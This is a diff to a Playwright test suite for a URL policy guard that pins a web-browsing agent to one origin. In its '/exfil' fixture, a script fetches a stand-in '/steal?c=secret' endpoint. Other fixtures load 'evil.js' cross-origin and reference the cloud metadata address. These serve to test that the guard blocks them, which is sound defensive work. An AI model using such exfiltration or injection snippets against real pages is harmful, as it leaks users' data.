@@ -14,6 +14,7 @@
 
 import { chromium, Browser, Page } from 'playwright';
 import { createServer, Server } from 'http';
+import { WebSocketServer } from 'ws';
 import { AddressInfo } from 'net';
 import * as fs from 'fs';
 import * as os from 'os';
@@ -21,6 +22,8 @@ import * as path from 'path';
 import { installUrlPolicyGuard, guardedGoto, MAX_REDIRECT_HOPS } from '../src/url-policy-guard';
 
 const METADATA = 'http://169.254.169.254/latest/meta-data/';
+
+let OFFSITE = '';
 
 const page = (title: string, body = '') =>
   `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>${title}</title></head><body>${body}</body></html>`;
@@ -30,6 +33,10 @@ describe('URL policy guard', () => {
   let origin: string;
   let browser: Browser;
   let requestLog: string[];
+  /** A genuinely different origin, for the pinning tests. */
+  let offsiteServer: Server;
+  let offsiteLog: string[];
+  let offsiteSocketConnections = 0;
 
   beforeAll(async () => {
     server = createServer((req, res) => {
@@ -79,6 +86,25 @@ describe('URL policy guard', () => {
           page('Home', '<a id="ok" href="/to-final">ok</a><a id="bad" href="/to-metadata">bad</a>'),
         );
       }
+      if (url === '/offsite-script') {
+        res.writeHead(200, { 'Content-Type': 'text/html' });
+        return res.end(page('Script', `<script src="${OFFSITE}/evil.js"></script>`));
+      }
+      if (url === '/exfil') {
+        res.writeHead(200, { 'Content-Type': 'text/html' });
+        return res.end(
+          page(
+            'Exfil',
+            `<img alt="x" src="${OFFSITE}/pixel.gif">` +
+              `<script>window.probe = fetch("${OFFSITE}/steal?c=secret")` +
+              `.then(() => "allowed").catch(() => "blocked")</script>`,
+          ),
+        );
+      }
+      if (url === '/to-offsite') {
+        res.writeHead(302, { Location: 'https://example.com/' });
+        return res.end();
+      }
       if (url === '/frame-loop-host') {
         res.writeHead(200, { 'Content-Type': 'text/html' });
         return res.end(page('Outer', '<iframe src="/loop"></iframe>'));
@@ -99,6 +125,19 @@ describe('URL policy guard', () => {
       res.writeHead(200, { 'Content-Type': 'text/html' });
       res.end(page('Final', '<h1>Final</h1>'));
     });
+    offsiteServer = createServer((req, res) => {
+      offsiteLog.push(req.url ?? '/');
+      res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'image/gif' });
+      res.end(Buffer.from('R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==', 'base64'));
+    });
+    new WebSocketServer({ server: offsiteServer }).on('connection', () => {
+      offsiteSocketConnections++;
+    });
+    await new Promise<void>((resolve) => offsiteServer.listen(0, resolve));
+    // 127.0.0.1 rather than localhost: a different host string is a different
+    // origin, which is the point.
+    OFFSITE = `http://127.0.0.1:${(offsiteServer.address() as AddressInfo).port}`;
+
     await new Promise<void>((resolve) => server.listen(0, resolve));
     origin = `http://localhost:${(server.address() as AddressInfo).port}`;
     browser = await chromium.launch({ headless: true });
@@ -109,6 +148,9 @@ describe('URL policy guard', () => {
     await new Promise<void>((resolve, reject) =>
       server.close((err) => (err ? reject(err) : resolve())),
     );
+    await new Promise<void>((resolve, reject) =>
+      offsiteServer.close((err) => (err ? reject(err) : resolve())),
+    );
   });
 
   let context: Awaited<ReturnType<Browser['newContext']>>;
@@ -116,6 +158,8 @@ describe('URL policy guard', () => {
 
   beforeEach(async () => {
     requestLog = [];
+    offsiteLog = [];
+    offsiteSocketConnections = 0;
     context = await browser.newContext();
     p = await context.newPage();
   });
@@ -291,6 +335,153 @@ describe('URL policy guard', () => {
       await p.waitForTimeout(1000);
 
       expect(p.frames().map((f) => f.url())).toContain(`${origin}/final`);
+    }, 60_000);
+  });
+
+  describe('origin pinning at the request layer (issue #151)', () => {
+    // A pre-action policy check notices a same-origin click that navigates away
+    // only on the NEXT turn — by which time the cross-origin request has already
+    // gone out. Confinement has to happen before the request, not after.
+    it('blocks a same-origin link that redirects off-origin', async () => {
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+      await guardedGoto(p, `${origin}/click-source`);
+
+      await expect(guardedGoto(p, `${origin}/to-offsite`)).rejects.toThrow(
+        /leaves the pinned origin/,
+      );
+    }, 60_000);
+
+    it('blocks a direct navigation to another origin', async () => {
+      await installUrlPolicyGuard(p, { pinnedOrigin: 'https://elsewhere.example' });
+
+      await expect(guardedGoto(p, `${origin}/final`)).rejects.toThrow(/leaves the pinned origin/);
+    }, 60_000);
+
+    it('merges a second install instead of registering a second handler', async () => {
+      // Playwright runs the most recently added handler first and ours never
+      // calls fallback(), so a second install would silently supersede the first
+      // and drop its options. The agent loop installs a pin on top of whatever
+      // the executor already set, so this has to merge.
+      await installUrlPolicyGuard(p, { blockPrivateHosts: true });
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+
+      // The pin is satisfied here — same origin — so the only thing that can
+      // refuse this is the FIRST install's option, which must have survived.
+      await expect(guardedGoto(p, `${origin}/final`)).rejects.toThrow(/private\/loopback/);
+    }, 60_000);
+
+    it('pins active cross-origin requests but not passive ones', async () => {
+      // fetch/XHR/websocket carry data off-origin and return readable
+      // responses, so a same-origin click that fires one is an exfiltration
+      // channel the per-action check cannot see. Images and fonts are not —
+      // refusing those would break the page the agent is trying to read.
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+
+      await guardedGoto(p, `${origin}/exfil`, { waitUntil: 'networkidle' });
+
+      await expect(
+        p.evaluate(() => (window as unknown as { probe: Promise<string> }).probe),
+      ).resolves.toBe('blocked');
+      // The passive image still went out, so this is a targeted limit rather
+      // than "refuse everything cross-origin".
+      expect(offsiteLog).toContain('/pixel.gif');
+      expect(offsiteLog).not.toContain('/steal?c=secret');
+    }, 60_000);
+
+    it('pins a cross-origin script, which is code execution not a static asset', async () => {
+      // A cross-origin script runs with the page's authority: it can read the
+      // DOM and act as the user, which is the post-click injection scenario this
+      // control exists for. Exempting it because it looks like a static asset in
+      // a network log would undo the confinement.
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+
+      await guardedGoto(p, `${origin}/offsite-script`, { waitUntil: 'networkidle' });
+
+      expect(offsiteLog).not.toContain('/evil.js');
+    }, 60_000);
+
+    it('closes a cross-origin WebSocket before it connects', async () => {
+      // page.route never sees a WebSocket upgrade, so the resource-type list
+      // could not cover this — it needs routeWebSocket. A readable,
+      // bidirectional channel off-origin is the last thing to leave exempt.
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+      await guardedGoto(p, `${origin}/final`);
+
+      const outcome = await p.evaluate(
+        (url) =>
+          new Promise<string>((resolve) => {
+            const ws = new WebSocket(url);
+            ws.onopen = () => resolve('open');
+            ws.onclose = (e) => resolve(`close ${e.code}`);
+            ws.onerror = () => resolve('error');
+            setTimeout(() => resolve('timeout'), 4000);
+          }),
+        OFFSITE.replace('http:', 'ws:'),
+      );
+
+      // 1008 is the guard's own close code, so this asserts the refusal rather
+      // than merely that the socket did not open.
+      expect(outcome).toBe('close 1008');
+      expect(offsiteSocketConnections).toBe(0);
+    }, 60_000);
+
+    it.skip('permits a same-origin WebSocket (blocked by #154)', async () => {
+      // Kept, skipped, as the acceptance test for #154: fulfilling the document
+      // response breaks every WebSocket upgrade on a guarded page, same-origin
+      // included, so the permission half of the pin cannot be exercised yet.
+      // Enable this when #154 is fixed.
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+      await guardedGoto(p, `${origin}/final`);
+
+      const outcome = await p.evaluate(
+        (url) =>
+          new Promise<string>((resolve) => {
+            const ws = new WebSocket(url);
+            ws.onopen = () => resolve('open');
+            ws.onclose = (e) => resolve(`close ${e.code}`);
+            ws.onerror = () => resolve('error');
+            setTimeout(() => resolve('timeout'), 4000);
+          }),
+        origin.replace('http:', 'ws:'),
+      );
+
+      expect(outcome).toBe('open');
+    }, 60_000);
+
+    it('follows a pin that a later install changed', async () => {
+      // The WebSocket predicate must read the live policy. Closing over the
+      // value passed at install time would keep enforcing the origin that was
+      // pinned first, allowing sockets to it and refusing them to the new one.
+      await installUrlPolicyGuard(p, { pinnedOrigin: 'http://stale.example' });
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+      await guardedGoto(p, `${origin}/final`);
+
+      const outcome = await p.evaluate(
+        (url) =>
+          new Promise<string>((resolve) => {
+            const ws = new WebSocket(url);
+            ws.onopen = () => resolve('open');
+            ws.onclose = (e) => resolve(`close ${e.code}`);
+            ws.onerror = () => resolve('error');
+            setTimeout(() => resolve('timeout'), 4000);
+          }),
+        'ws://stale.example/',
+      );
+
+      // Refused against the CURRENT pin, not permitted by the stale one.
+      expect(outcome).toBe('close 1008');
+    }, 60_000);
+
+    it('does NOT block cross-origin sub-resources', async () => {
+      // Pinning is a navigation control. A page legitimately loads images and
+      // fonts from other origins, and refusing those would break the very page
+      // the agent is trying to read.
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+
+      await guardedGoto(p, `${origin}/subresource-ok`, { waitUntil: 'networkidle' });
+
+      await expect(p.title()).resolves.toBe('Sub');
+      expect(requestLog).toContain('/pixel');
     }, 60_000);
   });
 
